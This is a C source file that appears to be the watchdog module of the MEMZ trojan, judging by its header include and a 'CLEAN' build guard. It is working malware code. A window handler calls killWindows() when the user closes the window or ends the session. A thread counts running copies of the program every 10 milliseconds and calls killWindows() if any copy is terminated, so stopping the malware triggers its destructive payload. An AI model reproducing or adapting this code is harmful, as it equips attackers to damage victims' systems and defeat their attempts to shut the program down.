#include "../MEMZ.h"

#ifndef CLEAN
//extern DWORD GetProcessImageFileNameA(HANDLE, LPSTR, DWORD);
//extern int QueryFullProcessImageNameA(HANDLE, DWORD, LPSTR, DWORD *);

LRESULT CALLBACK watchdogWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
		killWindows();
		return 0;
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}

DWORD WINAPI watchdogThread(LPVOID parameter) {
	int oproc = 0;

	char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
#if 0
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);
#else
	GetModuleFileNameA(NULL, fn, 512);
#endif

	Sleep(1000);

	for (;;) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		Process32First(snapshot, &proc);

		int nproc = 0;
		do {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, proc.th32ProcessID);
			char *fn2 = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
#if 0
#if 0
			GetProcessImageFileNameA(hProc, fn2, 512);
#else
			QueryFullProcessImageNameA(hProc, 0, fn2, 512);
#endif
#else
			DWORD len = GetModuleFileNameExA(hProc, NULL, fn2, 512);
#endif

			if (len && lstrcmpA(fn, fn2) == 0) {
				nproc++;
			}

			CloseHandle(hProc);
			LocalFree(fn2);
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (nproc < oproc) {
			killWindows();
		}

		oproc = nproc;

		Sleep(10);
	}
}
#endif
